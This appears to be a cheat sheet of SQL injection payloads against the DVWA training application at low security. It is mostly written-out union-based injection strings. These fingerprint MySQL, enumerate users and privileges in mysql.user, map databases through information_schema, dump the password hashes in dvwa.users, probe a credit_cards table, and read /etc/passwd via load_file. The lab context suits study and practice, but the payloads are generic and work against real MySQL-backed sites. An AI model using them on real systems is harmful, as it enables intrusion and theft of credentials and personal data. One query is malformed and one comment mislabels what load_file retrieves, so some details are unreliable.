#DVWA on Low security
SELECT ? FROM ? WHERE '$id';

SELECT ? FROM ? WHERE '1';

SELECT ? FROM ? WHERE '1'';

'

SELECT ? FROM ? WHERE '1' OR '1' = '1';

#comment out to the right
SELECT ? FROM ? WHERE '1'#';

SELECT ? FROM ? WHERE '1'--';

SELECT ? FROM ? WHERE '1'/*';

*/

SELECT ? FROM ? WHERE '1'UNION SELECT 1,2,3 #';

SELECT ? FROM ? WHERE '1'UNION SELECT 1,2 #';

SELECT ? FROM ? WHERE ''UNION SELECT NULL,Payload #';


#finding out if its MYSQL, NOW is a MYSQL specific function
SELECT ? FROM ? WHERE ''UNION SELECT NULL,NOW() #';
#If you get date output like the above, then you know that you are dealing with MySQL as NOW() is MySQL specific.


#check what database version this is
SELECT ? FROM ? WHERE ''UNION SELECT NULL,VERSION() #';
#knowing the database and version greatly simplifies both the exploration phase and exploitation phases, as it both allows to look up reference manual and/or craft your SQL queries in a similar environment.


#who am I and what host am I connecting form
SELECT ? FROM ? WHERE ''UNION SELECT NULL,CURRENT_USER() #';
#A SELECT command denied with an error for the, so called, mysql database in mysql, immediately tells you you have limited rights.
#If you do get a list of users, then you could make some further enquiries to mysql database regarding your (or other users') grants, 

#Enumerating users and checking my GRANTS
SELECT ? FROM ? WHERE ''UNION ALL SELECT,hosts, user FROM mysql.user #';
#super_priv rights 'Y' is really only reserved for the database administrator account. 
#See also specific reference manual for your version and look for 'grant tables'

#What grants do I have myself?
SELECT ? FROM ? WHERE ''UNION ALL SELECT NULL,super_priv FROM mysql.user WHERE user = 'root' and host='%' #';
#Only if you lack rights on a higher level (mysql_user) you will want to check them on a lower level.

#finding database structure through SQL injection
#Even if you have limited rights to mysql database, you will still have access to information_schema database.
SELECT ? FROM ? WHERE ''UNION SELECT TABLE_NAME,TABLE_SCHEMA FROM information_schema.tables GROUP BY TABLE_SCHEMA#';
#This will allow you to enumerate databases, tables and those columns for all of which you somehow have access to.

#show tables from a specific database
SELECT ? FROM ? WHERE ''UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'dvwa'#';

#Show colomns from database table.
SELECT ? FROM ? WHERE ''UNION SELECT table_name, CONCAT_WS(',', column_name, column_type, is_nullable, column_key, column_default, extra) FROM information_schema.columns WHERE table_schema = 'dvwa' AND table_name = 'users'#';

#Retreieve DVWA password hashes
SELECT ? FROM ? WHERE ''UNION SELECT user, password FROM dvwa.users #';
#This data will allow you to use a password cracking tool to decipher the hashes and from there on get access to someone’s web application account.

#Concatenating multiple fields
SELECT ? FROM ? WHERE ''UNION SELECT table_name, CONCAT_WS(',',column_name,column_type,is_nullable,column_key,column_default,extra) FROM information_schema.columns WHERE table_schema = 'owasp10' AND table_name = 'credit_cards'#';

#Exploring the host
SELECT ? FROM ? WHERE ''UNION SELECT NULL, CONCAT_WS(',', @@version, @@version_comment, @@version_compile_machine, @@version_compile_os)#';

#Retrieving password hashes, assuming you have been Granted file priv
SELECT ? FROM ? WHERE ''union select null, load_file('/etc/passwd')#';


